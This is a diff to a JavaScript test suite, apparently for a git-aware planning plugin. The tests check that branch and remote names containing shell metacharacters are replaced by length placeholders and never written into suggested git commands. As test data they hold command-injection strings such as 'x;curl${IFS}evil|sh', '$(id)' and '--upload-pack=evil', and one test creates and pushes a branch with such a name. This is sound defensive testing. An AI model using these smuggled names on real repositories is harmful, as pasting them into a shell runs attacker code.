@@ -20,13 +20,22 @@ import {
   BRANCH_GATE, checkBranchPosture, formatBranchHalt, formatBranchLine, formatBranchUnknown, readPullRequestEvidence,
 } from '../plugin/tools/lib/branch-guard.js';
 import { closeEpic } from '../plugin/tools/lib/work-ops.js';
+import { findWorkOnOtherBranches, formatOtherBranchWork, nextStepFor } from '../plugin/tools/lib/branch-work.js';
+import { resolveStartPhase } from '../plugin/tools/lib/drive.js';
+import { formatAdviseSummary, renderArtifact } from '../plugin/tools/lib/advise.js';
+import { readCorpus } from '../plugin/tools/lib/advise-corpus.js';
+import { isPlainRefName, shownRef } from '../plugin/tools/lib/printable-text.js';
 import { checkClosedProofs } from '../plugin/tools/lib/sweep.js';
 import { UNIT_KIND } from '../plugin/tools/lib/unit-record.js';
 import { regenerateViews } from '../plugin/tools/lib/work-views.js';
 
 // A backtick, an em space (U+2003) and a right-to-left override (U+202E).
 const NAME = 'ma`in x‮y';
-const SHOWN = 'ma`in\\u2003x\\u202ey';
+// r6.3: not escaped any more — a name that is not plainly a name is not shown
+// at all (`shownRef`, `printable-text.js`): escaping left `;`, `$`, `|` and
+// the backtick in, inline in a message a person may copy from.
+const SHOWN = `(a branch whose name is not shown: ${NAME.length} characters)`;
+const SHOWN_ON_ORIGIN = `(a branch whose name is not shown: ${`origin/${NAME}`.length} characters)`;
 const RAW = new RegExp('[\\u2003\\u202e]'); // either character as it is, unescaped
 const AT = '2026-10-01T10:00:00.000Z';
 const by = 'claude';
@@ -105,7 +114,7 @@ describe('a branch name with an em space, a right-to-left override and a backtic
     await onDefaultBranch({ remote: 'up‮stream' });
     const posture = checkBranchPosture(work, { tier: 'FULL' });
     expect(posture.status).toBe(BRANCH_GATE.CANNOT_DETERMINE);
-    expect(posture.reason).toContain('(this repository has: up\\u202estream)');
+    expect(posture.reason).toContain('(this repository has: (a remote whose name is not shown: 9 characters))');
     expect(posture.reason).not.toMatch(RAW);
     expect(formatBranchUnknown(posture)).not.toMatch(RAW);
   });
@@ -115,7 +124,8 @@ describe('a branch name with an em space, a right-to-left override and a backtic
     await put('src/the-epic.js', '// not committed\n');
     const err = await closeEpic(work, EPIC, { by, at: AT }).catch((e) => e);
     expect(err).toMatchObject({ code: 'CONFLICT' });
-    expect(err.message).toContain(`already on the default branch (origin/${SHOWN})`);
+    expect(err.message).toContain(`already on the default branch (${SHOWN_ON_ORIGIN})`);
+    expect(err.message).not.toContain('`in');
     expect(err.message).not.toMatch(RAW);
   });
 
@@ -126,7 +136,110 @@ describe('a branch name with an em space, a right-to-left override and a backtic
     });
     const found = checkClosedProofs(work);
     expect(found).toHaveLength(1);
-    expect(found[0].message).toContain(`is not on origin/${SHOWN} in this clone`);
+    expect(found[0].message).toContain(`is not on ${SHOWN_ON_ORIGIN} in this clone`);
     expect(found[0].message).not.toMatch(RAW);
+  });
+});
+
+// ── r6.3: one function decides, and a command is never built from such a name ──
+
+describe('shownRef and isPlainRefName', () => {
+  it('a plain name is shown as it is; anything else as a placeholder with its length', () => {
+    for (const name of ['main', 'feat/m6.e16-epics_units', 'origin/HEAD', 'release-1.2', 'a'.repeat(100)]) {
+      expect(isPlainRefName(name), name).toBe(true);
+      expect(shownRef(name), name).toBe(name);
+    }
+    for (const name of ['x;curl${IFS}evil|sh', 'a b', 'a`b', '$(id)', 'a&b', "a'b", 'a"b', 'a>b', 'a\nb', '-x', '--upload-pack=evil', 'a'.repeat(101), '', 'é']) {
+      expect(isPlainRefName(name), JSON.stringify(name)).toBe(false);
+      expect(shownRef(name), JSON.stringify(name)).toBe(`(a branch whose name is not shown: ${name.length} characters)`);
+    }
+    expect(shownRef('up;stream', 'remote')).toBe('(a remote whose name is not shown: 9 characters)');
+    expect(isPlainRefName(undefined)).toBe(false);
+  });
+
+  it('the halt copy does not put a suggested branch that is not plainly a name into its command', () => {
+    const halt = formatBranchHalt({ defaultBranch: 'main' }, { command: '/sig:execute', suggestedBranch: 'feat/x;curl evil|sh' });
+    expect(halt).toContain('    git checkout -b feat/<short-name>');
+    expect(halt).not.toContain('curl');
+    expect(formatBranchHalt({ defaultBranch: 'main' }, { command: '/sig:execute', suggestedBranch: 'feat/m7.e3' })).toContain('    git checkout -b feat/m7.e3');
+  });
+});
+
+// A remote branch named by whoever pushed it: `x;curl${IFS}evil|sh` is a name
+// git accepts. Pasted into a shell as part of `git checkout <name>`, it runs.
+describe('an Epic open on a branch whose name is a shell command', { timeout: 60_000 }, () => {
+  const HOSTILE = 'x;curl${IFS}evil|sh';
+  const NOT_SHOWN = `(a branch whose name is not shown: ${HOSTILE.length} characters)`;
+  const STATE = (epic) => `---\nschema_version: 1\nphase: PLAN\ncurrent_epic: ${epic}\ncurrent_wave: null\ncurrent_tasks: []\ncompleted_phases: []\n---\n\n# State\n`;
+
+  // `main` here has shipped M1.E1; the hostile branch holds M1.E2, open.
+  async function repoWithHostileBranch({ pushedTo = null } = {}) {
+    g(work, 'init', '-q', '-b', 'main');
+    await put('.planning/STATE.md', STATE('M1.E1').replace('completed_phases: []', 'completed_phases:\n  - DISCUSS (2026-09-01)\n  - SHIP (2026-09-02)').replace('phase: PLAN', 'phase: SHIP'));
+    await put('.planning/BACKLOG.md', '# Backlog\n\n### B200 — a backlog row · **hygiene** · small\nFiled 2026-09-01.\n');
+    g(work, 'add', '-A');
+    g(work, 'commit', '-q', '-m', 'init');
+    g(work, 'checkout', '-q', '-b', HOSTILE);
+    await put('.planning/STATE.md', STATE('M1.E2'));
+    g(work, 'commit', '-q', '-am', 'work');
+    g(work, 'checkout', '-q', 'main');
+    if (pushedTo) {
+      g(root, 'init', '-q', '--bare', '-b', 'main', join(root, 'remote.git'));
+      g(work, 'remote', 'add', pushedTo, join(root, 'remote.git'));
+      g(work, 'push', '-q', pushedTo, HOSTILE);
+      g(work, 'branch', '-q', '-D', HOSTILE);
+    }
+  }
+  const noCommand = (text) => {
+    expect(text).not.toContain('curl');
+    expect(text).not.toContain('${IFS}');
+    expect(text).not.toMatch(/git checkout|git pull [^`]/);
+  };
+
+  it('a local branch: the exact name stays in the result; the next step, the report line and the driver give no command and no name', async () => {
+    await repoWithHostileBranch();
+    const r = await findWorkOnOtherBranches(work, { localEpic: 'M1.E1' });
+    expect(r.open).toMatchObject([{ epic: 'M1.E2', branches: [HOSTILE], checkout: HOSTILE }]);
+    const step = nextStepFor(r.open[0]);
+    noCommand(step);
+    expect(step).toContain(`cannot be written safely in a command (${HOSTILE.length} characters), so none is given`);
+    const line = formatOtherBranchWork(r);
+    noCommand(line);
+    expect(line).toContain(`M1.E2 is open at PLAN on ${NOT_SHOWN}`);
+    // the driver's block, with the shared step and with only the branch to go on
+    for (const candidate of [{ id: 'M1.E2', branch: HOSTILE, phase: 'PLAN', nextStep: step }, { id: 'M1.E2', branch: HOSTILE, phase: 'PLAN' }]) {
+      const block = resolveStartPhase({ phase: 'SHIP' }, candidate);
+      expect(block.blocked).toBe(true);
+      noCommand(block.why);
+    }
+    // the advisory, its summary and the digest a model reads
+    const corpus = await readCorpus(work);
+    expect(corpus.sources.otherBranches.open.map((o) => o.epic)).toEqual(['M1.E2']);
+    const classified = { live: [], dropped: [], consulted: ['BACKLOG.md'] };
+    const body = renderArtifact({ today: '2026-10-01', classified, priorities: [], corpus, projectName: 'x' });
+    expect(body).toContain(`**M1.E2** — at PLAN on ${NOT_SHOWN}; `);
+    noCommand(body);
+    const summary = formatAdviseSummary({ status: 'written', today: '2026-10-01', classified, priorities: [], corpus, path: 'p' });
+    expect(summary).toContain(`M1.E2 is open on ${NOT_SHOWN} — finish it first`);
+    noCommand(summary);
+  });
+
+  it('pushed to a remote, the local branch gone: the same, by its remote name', async () => {
+    await repoWithHostileBranch({ pushedTo: 'origin' });
+    const r = await findWorkOnOtherBranches(work, { localEpic: 'M1.E1' });
+    expect(r.open).toMatchObject([{ epic: 'M1.E2', branches: [`origin/${HOSTILE}`] }]);
+    noCommand(nextStepFor(r.open[0]));
+    noCommand(formatOtherBranchWork(r));
+  });
+
+  it('a plain name is unchanged: the command is given', async () => {
+    g(work, 'init', '-q', '-b', 'main');
+    await put('.planning/STATE.md', STATE('M1.E1'));
+    g(work, 'add', '-A');
+    g(work, 'commit', '-q', '-m', 'init');
+    expect(nextStepFor({ sameBranch: false, branches: ['feat/m1.e2'], checkout: 'feat/m1.e2', worktree: null })).toBe('run `git checkout feat/m1.e2` to continue it');
+    expect(nextStepFor({ sameBranch: true, branches: ['upstream/main'], checkout: 'main', pull: 'git pull upstream main' })).toContain('run `git pull upstream main`');
+    // a remote copy of this branch on a remote whose name is not plain: no command
+    expect(nextStepFor({ sameBranch: true, branches: ['up;rm/main'], checkout: 'main', pull: false })).not.toMatch(/`git pull/);
   });
 });
